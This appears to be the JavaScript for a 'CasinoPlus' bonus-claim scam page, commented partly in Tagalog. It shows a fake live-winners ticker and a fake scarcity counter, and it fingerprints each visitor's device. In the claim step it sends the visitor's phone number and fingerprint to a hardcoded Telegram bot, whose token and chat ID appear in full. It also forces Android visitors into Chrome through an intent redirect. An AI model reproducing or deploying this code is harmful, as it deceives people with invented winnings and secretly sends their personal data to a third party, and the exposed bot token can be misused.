/**
 * CasinoPlus Index Page - Main Logic with Device Fingerprint Ban
 */

// Firebase reference
let db = null;

// Telegram config
const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const chatId = '7298607329';

// ========== DEVICE FINGERPRINT (Hindi nawawala kahit mag-clear ng data) ==========
function getDeviceFingerprint() {
    // Kunin ang mga unique specs ng device/browser
    const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    
    // Combine lahat ng specs para maging unique fingerprint
    const fingerprintString = `${userAgent}|${screenResolution}|${timezone}|${language}|${platform}|${hardwareConcurrency}|${deviceMemory}`;
    
    // I-hash para maging simple ang format (optional)
    let hash = 0;
    for (let i = 0; i < fingerprintString.length; i++) {
        hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
        hash |= 0;
    }
    
    return `FP_${Math.abs(hash)}`;
}

// Check kung ang device fingerprint ay banned na sa Firebase
async function isDeviceBanned(fingerprint) {
    const snap = await db.ref('banned_devices/' + fingerprint).once('value');
    return snap.exists();
}

// Ban ang device fingerprint sa Firebase
async function banDevice(fingerprint, phone, reason) {
    await db.ref('banned_devices/' + fingerprint).set({
        phone: phone,
        reason: reason,
        timestamp: Date.now()
    });
}

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
db = firebase.database();

// Scarcity counter
let count = 88;

// DOM Elements
const winnerEntry = document.getElementById('winnerEntry');
const remNum = document.getElementById('remNum');
const pBar = document.getElementById('pBar');
const modalOverlay = document.getElementById('modalOverlay');
const mainCard = document.getElementById('mainCard');
const userPhoneInput = document.getElementById('userPhone');
const claimBtn = document.getElementById('claimBtn');

// Show blocked UI (claimed or banned)
function showBlockedUI(reason = "claimed", extraMessage = "") {
    const overlay = document.getElementById('modalOverlay');
    overlay.style.display = 'flex';
    
    let blockMessage = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
    let title = "RESTRICTED";
    
    if (reason === "banned") {
        title = "TERMINATED";
        blockMessage = "⚠️ ACCESS_DENIED: This number or device has already received a successful payout.";
    }
    
    if (reason === "device_banned") {
        title = "DEVICE BANNED";
        blockMessage = "⚠️ This device has been permanently restricted. Your device fingerprint is recorded in our system. " + extraMessage;
    }

    document.getElementById('modalBodyContent').innerHTML = `
        <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
        <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
        <div style="font-size: 50px; margin: 20px 0;">🚫</div>
        <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none; animation: none;" onclick="location.reload()">Device Locked</button>
    `;
    mainCard.style.opacity = "0.2";
    mainCard.style.pointerEvents = "none";
}

// Handle verify button click
window.handleVerify = function() {
    if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
    const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
    if (!window.location.hash.includes("verified")) {
        window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
    } else {
        modalOverlay.style.display = 'flex';
    }
};

// Process phone number and redirect to main
window.processStep1 = async function() {
    const phone = userPhoneInput.value.trim();
    const btn = claimBtn;
    const deviceFingerprint = getDeviceFingerprint();

    if (phone.length < 11 || !phone.startsWith('09')) {
        alert("Enter valid 11-digit number.");
        return;
    }
    
    btn.disabled = true; 
    btn.innerHTML = "CHECKING SECURE STATUS...";

    // ========== STEP 1: Check kung ang DEVICE FINGERPRINT ay banned na ==========
    const deviceBanned = await isDeviceBanned(deviceFingerprint);
    if (deviceBanned) {
        localStorage.setItem("cp_device_locked", "true");
        showBlockedUI("device_banned", "Your device fingerprint has been recorded.");
        return;
    }

    // ========== STEP 2: Check kung ang PHONE NUMBER ay banned ==========
    db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
        if (banSnap.exists()) {
            // I-ban din ang device fingerprint para hindi na maka-claim gamit ang ibang number
            await banDevice(deviceFingerprint, phone, "phone_banned");
            localStorage.setItem("cp_device_locked", "true");
            showBlockedUI("banned");
            return;
        }

        // ========== STEP 3: Check kung ang PHONE NUMBER ay naka-claim na ==========
        db.ref('user_logs/' + phone).once('value', async (snapshot) => {
            const userData = snapshot.val();

            if (userData && userData.status === 'claimed') {
                // I-ban din ang device fingerprint
                await banDevice(deviceFingerprint, phone, "claimed_device");
                localStorage.setItem("cp_device_locked", "true");
                showBlockedUI();
                return;
            }

            // ========== STEP 4: Check kung ang DEVICE ay may na-claim na ibang number ==========
            const devicePhoneMap = await db.ref('device_phone_map/' + deviceFingerprint).once('value');
            const previousPhone = devicePhoneMap.val();
            
            if (previousPhone && previousPhone !== phone) {
                // Ang device na ito ay gumamit na ng ibang number dati
                // Possible na nag-cheat ang user
                await banDevice(deviceFingerprint, phone, "multiple_numbers");
                localStorage.setItem("cp_device_locked", "true");
                showBlockedUI("device_banned", "This device has been detected using multiple numbers.");
                return;
            }

            // ========== STEP 5: Static blacklist check ==========
            const blockedList = window.BLACKLISTED_NUMBERS || [];
            if (blockedList.includes(phone)) {
                await banDevice(deviceFingerprint, phone, "static_blacklist");
                localStorage.setItem("cp_device_locked", "true");
                showBlockedUI("banned");
                return;
            }

            // ========== STEP 6: Save device to phone mapping ==========
            await db.ref('device_phone_map/' + deviceFingerprint).set({
                phone: phone,
                firstSeen: Date.now(),
                lastSeen: Date.now()
            });

            // ========== STEP 7: Create/Update user session ==========
            db.ref('user_sessions/' + phone).once('value', s => {
                if(!s.exists()) {
                    db.ref('user_sessions/' + phone).set({
                        phone: phone,
                        balance: 0,
                        clicks: 0,
                        hasShared: false,
                        deviceFingerprint: deviceFingerprint,
                        lastUpdate: Date.now()
                    });
                } else {
                    db.ref('user_sessions/' + phone).update({ 
                        lastUpdate: Date.now(),
                        deviceFingerprint: deviceFingerprint
                    });
                }
            });

            // ========== STEP 8: Proceed to main game ==========
            try {
                localStorage.setItem("userPhone", phone);
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone + "\n🖥️ Device FP: " + deviceFingerprint)}`);
                localStorage.setItem("cp_verified", "true");
                btn.innerHTML = "SUCCESS...";
                setTimeout(() => { window.location.href = "main.html"; }, 1000);
            } catch (e) {
                localStorage.setItem("userPhone", phone);
                localStorage.setItem("cp_verified", "true");
                window.location.href = "main.html";
            }
        });
    });
};

// Live winners ticker
function startTicker() {
    setInterval(() => {
        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const amounts = [350, 500, 750, 1000, 1200];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        if (winnerEntry) {
            winnerEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amount}`;
        }
    }, 3500);
}

// Scarcity counter
function startScarcityCounter() {
    setInterval(() => {
        if (count > 15) {
            count -= Math.floor(Math.random() * 2) + 1;
            if (remNum) remNum.innerText = count + "/100";
            if (pBar) pBar.style.width = count + "%";
        }
    }, 5000);
}

// Check device lock on load
window.onload = () => {
    if (localStorage.getItem("cp_device_locked") === "true") {
        showBlockedUI();
    } else if (window.location.hash.includes("verified")) {
        modalOverlay.style.display = 'flex';
    }
};

// Initialize all
startTicker();
startScarcityCounter();
